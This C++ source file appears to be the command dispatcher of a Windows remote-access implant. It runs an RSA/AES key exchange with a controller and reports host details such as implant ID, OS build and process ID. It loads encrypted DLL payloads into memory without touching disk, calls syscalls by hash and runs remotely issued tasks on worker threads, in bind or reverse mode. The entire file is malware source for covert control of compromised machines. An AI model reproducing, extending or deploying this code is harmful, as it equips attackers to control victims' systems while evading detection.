#include <Windows.h>
#include <vector>
#include <globalvars.h>
#include <string> 
#include <rsa.h>
#include <AES.h>
#include <random>
#include <mem_ldr.h>
#include <dispatch.h>
#include <winsock.h>
#include <cmd_parser.hpp>
#include <syslib.hpp>
#include <cutils.h>
#include <hashtable.h>
#include <net.h>
#include <structs.h>
#include <intstructs.h>
#include <module_context.h>
#include <thread>
#pragma comment(lib, "version.lib")

extern CONFIG g_conf;
syslib *psyslib = 0;
extern int g_timeout;
std::vector<PWORKEROBJECT> g_worker_list;
unsigned char pubkey[283] = {
  'R', 'S', 'A', '1'
};

constexpr BOOL check_connection(int bytes) {
	if (bytes <= 0) {
		return 0;
	}
	return 1;
}

std::vector<UCHAR> geneate_random(int len) {
	std::random_device engine;
	std::vector<UCHAR> array;
	for (int i = 0; i < len; i++) {
		array.push_back(engine());
	}
	return array;
}

PULONG load_base(SOCKET client_socket, std::vector<UCHAR> aes_key, std::vector<UCHAR> iv) {
	AES aes(AESKeyLength::AES_256);
	std::vector<UCHAR> encrypted_payload_info(64);
	int sz = 0;
	if (g_conf.payload_type == PAYLOAD_BIND) {
		sz = sizeof(PAYLOADINFO);
	}
	recv_payloadinfo(client_socket, (char*)encrypted_payload_info.data(), sz); //L"Content-Language: en-CA\r\n"
	if (sz) {
		std::vector<UCHAR> payload_rawdata = aes.DecryptCBC(encrypted_payload_info, aes_key, iv);
		PPAYLOADINFO payload_info = (PPAYLOADINFO)payload_rawdata.data();
		PPAYLOAD payload_part;

		std::vector<UCHAR> encrypted_payload(payload_info->payload_size);
		sz = payload_info->payload_size;
		recv_payload(client_socket, (char*)encrypted_payload.data(), sz); // L"Content-Language: en-AU\r\n"
		auto addr = MemoryLoadLibrary(aes.DecryptCBC(encrypted_payload, aes_key, iv).data(), sz);
		auto proc = MemoryGetProcAddressP(addr->codeBase, HASH_RemoteCall);
		//AddFakeModule((WCHAR*)L"basedll.dll", (WCHAR*)L"basedll.dll", (UINT_PTR)addr->codeBase, sz);
		if (addr && proc){
			return (PULONG)addr;
		}
		else {
			MemoryFreeLibrary(addr);
		}
		return 0;
	}
}

void nt_sleep(int ms){
	LARGE_INTEGER delay;
	LONGLONG llDelay = ms * 10000LL;
	delay.QuadPart = -llDelay;
	psyslib->nt_call_2arg(HASH_NtDelayExecution, 0, &delay);
}
void end_session(PULONG base_library) {
	nt_sleep(5000);
	if (base_library){
		MemoryFreeLibrary((PMEMORYMODULE)base_library);
	}
}

VOID initialize_syscalls() {
	if (psyslib) return;
	psyslib = new syslib;
	psyslib->initialize_table();
}
bool verify_task_buffer(std::vector<UCHAR> command_data) {
	if (command_data.size() <= 0) return false;
	if (command_data.size() % 16 != 0) return false;
	return true;
}

PMODULE_CONTEXT prepare_module_context(HINTERNET client_socket, AES aes, std::vector<UCHAR> aes_key, std::vector<UCHAR> iv, PULONG base_library, std::vector<UCHAR> data, CONFIG* conf){
	PMODULE_CONTEXT ctx = (PMODULE_CONTEXT)LocalAlloc(LPTR, sizeof(MODULE_CONTEXT));
	ctx->base_library = base_library;
	ctx->aes_key = aes_key;
	ctx->iv = iv;
	ctx->netio.send_encrypted_taskresponse = send_encrypted_taskresponse;
	ctx->netio.send_encrypted_taskresponse_big = send_encrypted_taskresponse_big;
	ctx->conn_handle = (HANDLE)client_socket;
	ctx->pconfig = conf;
	ctx->psyslib = psyslib;
	ctx->userdata = data;
	return ctx;
}

VOID threaded_worker(PWORKEROBJECT this_object) {
	while (true)
	{
		WaitForSingleObject(this_object->syncevent, INFINITE);
		
		RemoteCall(this_object->modctx);

		ResetEvent(this_object->syncevent);
	}
};
PWORKEROBJECT get_worker(DWORD32 worker_id) {
	for (int i = 0; i < g_worker_list.size(); i++)
	{
		if (g_worker_list.at(i)->worker_thread_id == worker_id)
			return g_worker_list.at(i);
	}
	return NULL;
}
BOOL is_worker_exists(DWORD32 worker_id) {
	PWORKEROBJECT worker = get_worker(worker_id);
	if (worker) return TRUE;
	return FALSE;
}
LONG main_dispatch_loop(SOCKET hConnect, PULONG *base_library, BCRYPT_KEY_HANDLE key) {
	HELLOREQUEST inital_request;
	int sz = 0;
	if (g_conf.payload_type == PAYLOAD_BIND) {
		sz = sizeof(HELLOREQUEST);
	}

	recv_hellorequest((SOCKET)hConnect, (char*)&inital_request, sz); //L"Content-Language: en-US\r\n"
	if (sz)
	{
		ULONG magic_val1 = inital_request.val1;
		ULONG magic_val2 = inital_request.val2;


		if (magic_val1 + magic_val2 == MAGIC_VALUE)
		{
			IMPLANTINFO implant_information;
			HELLORESPONSE inital_response;
			SYSTEM_INFO sysinfo;

			std::vector<UCHAR> aes_key = geneate_random(32);
			std::vector<UCHAR> iv = geneate_random(16);
			AES aes(AESKeyLength::AES_256);
			implant_information.implant_arch = IMPLANT_ARCH;
			GetNativeSystemInfo(&sysinfo);
			if (sysinfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
				implant_information.platform_arch = 0x4;
			}
			else if (sysinfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
				implant_information.platform_arch = 0x8;
			}

			implant_information.implant_id = g_conf.id;
			implant_information.implant_platform = 0x8;
			implant_information.implant_version = IMPLANT_VERSION;
			_memcpy(implant_information.session_key, aes_key.data(), aes_key.size());

			DWORD dummy;
			DWORD _size = GetFileVersionInfoSizeExW(FILE_VER_GET_NEUTRAL, L"kernel32.dll", &dummy);
			PUCHAR buffer = new unsigned char[_size];
			GetFileVersionInfoExW(FILE_VER_GET_NEUTRAL, L"kernel32.dll", dummy, _size, buffer);
			PVOID _p;
			UINT _s = 0;
			VerQueryValueW(buffer, L"\\", &_p, &_s);
			auto pFixed = static_cast<const VS_FIXEDFILEINFO*>(_p);
			implant_information.nt_major = HIWORD(pFixed->dwFileVersionMS);
			implant_information.nt_minor = LOWORD(pFixed->dwFileVersionMS);
			implant_information.buildno_major = HIWORD(pFixed->dwFileVersionLS);
			implant_information.buildno_minor = LOWORD(pFixed->dwFileVersionLS);

			implant_information.current_pid = GetCurrentProcessId();

			PUCHAR encrypted_implant_info;
			ULONG encrypted_implant_info_length;
			encrypt_data(key, (unsigned char*)&implant_information, sizeof(IMPLANTINFO), encrypted_implant_info, encrypted_implant_info_length);
			_memcpy(&inital_response.implant_info, encrypted_implant_info, encrypted_implant_info_length);
			_memcpy(&inital_response.next_iv, iv.data(), iv.size());

			send_hellorequest((SOCKET)hConnect, (char*)&inital_response, (int)sizeof(HELLORESPONSE)); //L"Content-Language: en-US\r\n"
			nt_sleep(500);

			*base_library = load_base((SOCKET)hConnect, aes_key, iv);

			if (!(*base_library)) {
				return 1;
			}
			while (true)
			{
				std::vector<UCHAR> command_data;
				recv_encrypted_taskinfo(aes_key, iv, (SOCKET)hConnect, command_data); //L"Content-Language: en-NZ\r\n"
				//MessageBoxA(0, std::to_string(rid).c_str(), 0, 0);
				if (verify_task_buffer(command_data)) {
					if (!is_data_null((char*)command_data.data(), command_data.size()))
					{
						DWORD worker_id = 0;
						_memcpy(&worker_id, command_data.data(), 4);
						command_data.erase(command_data.begin(), command_data.begin() + 4);
						PMODULE_CONTEXT modctx = prepare_module_context((HINTERNET)hConnect, aes, aes_key, iv, *base_library, command_data, &g_conf);
						//char a[256];
						//sprintf(a, "%d(0x%x) wid %d userdata %llx", modctx->random_id, modctx->random_id, worker_id, modctx->userdata);
						//OutputDebugStringA(a);
						if (worker_id != 0) {
							if (!is_worker_exists(worker_id)) {
								PWORKEROBJECT pworker = new WORKEROBJECT;
								pworker->worker_thread_id = worker_id;

								HANDLE evt_data_reveived = CreateEventA(0, TRUE, 0, 0);
								pworker->syncevent = evt_data_reveived;
								pworker->modctx = modctx;
								//ÒÀÑÊ Î×ÅÐÅÄÜ!!!!!
								auto t = std::thread(threaded_worker, pworker);
								pworker->pthread = &t;
								g_worker_list.push_back(pworker);
								pworker->pthread->detach();

								SetEvent(pworker->syncevent);
							}
							else {
								auto worker = get_worker(worker_id);
								worker->modctx = modctx;
								SetEvent(worker->syncevent);
							}
						}
						else {
							auto worker = std::thread(RemoteCall, modctx);
							//RemoteCall((HINTERNET)hConnect, aes, aes_key, iv, *base_library, command_data, &g_conf);
							worker.detach();
						}
						//command_data.~vector();
					}
				}
				else if (g_conf.payload_type == PAYLOAD_REVERSE) {
					nt_sleep(g_timeout);
				}
				else if (g_conf.payload_type == PAYLOAD_BIND) {
					return 0;
				}
			}
		}
		return 0;
	}
	return 0;
}

void main_dispatcher(SOCKET hConnect) {
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE key = 0;
	PULONG base_library = 0;
	initialize_syscalls();

	BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RSA_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
	import_pubkey(hAlgorithm, (unsigned char*)pubkey, sizeof(pubkey), &key);
	HINTERNET hRequest = NULL;

	//std::wstring ws(g_conf.host, g_conf.host + sizeof(g_conf.host));
	if (g_conf.payload_type == PAYLOAD_REVERSE) {
		while (true)
		{
			int result = main_dispatch_loop(hConnect, &base_library, key);
			if (result) break;
			else nt_sleep(g_timeout);
		}
	}
	else if (g_conf.payload_type == PAYLOAD_BIND) {
		int result = main_dispatch_loop(hConnect, &base_library, key);
	}
	end_session(base_library);
}
volatile NTSTATUS RemoteCall(PMODULE_CONTEXT ctx) {
	auto proc = MemoryGetProcAddress((PMEMORYMODULE)ctx->base_library, HASH_RemoteCall);
	if (!proc) return ERROR_INVALID_ADDRESS;

	NTSTATUS status = ((NTSTATUS(*)(PMODULE_CONTEXT))proc)(ctx);
	ctx->userdata.~vector();
	LocalFree(ctx);
	return status;
}